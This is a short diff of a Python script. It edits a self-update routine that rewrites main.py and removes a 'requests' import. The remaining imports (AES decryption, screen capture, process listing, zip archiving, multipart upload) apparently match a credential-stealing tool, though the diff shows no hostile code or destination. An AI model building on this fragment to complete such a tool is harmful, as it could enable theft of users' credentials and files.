@@ -7,7 +7,7 @@ with open("main.py", "r") as f:
         print("Updating...")
         with open("main.py", "w") as f:
             f.write(script)
-            exit(0)
+
 import base64
 import ctypes
 import json
@@ -23,7 +23,7 @@ from shutil import copy2
 from zipfile import ZIP_DEFLATED, ZipFile
 
 import psutil
-import requests
+
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
